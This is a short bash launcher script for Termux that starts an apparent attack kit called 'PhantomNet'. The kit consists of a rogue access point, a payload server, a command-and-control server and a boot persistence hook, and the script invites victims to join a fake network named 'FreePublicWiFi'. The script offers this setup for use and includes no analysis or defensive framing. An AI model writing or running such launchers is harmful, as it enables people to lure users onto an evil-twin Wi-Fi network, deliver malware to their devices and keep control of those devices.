#!/data/data/com.termux/files/usr/bin/bash
killall dnsmasq php node 2>/dev/null
core/ap_manager.sh &
node core/payload_server.js &
node core/c2_server.js &
core/persistence/boot_hook &
echo "[+] PhantomNet LIVE! Connect to 'FreePublicWiFi'"
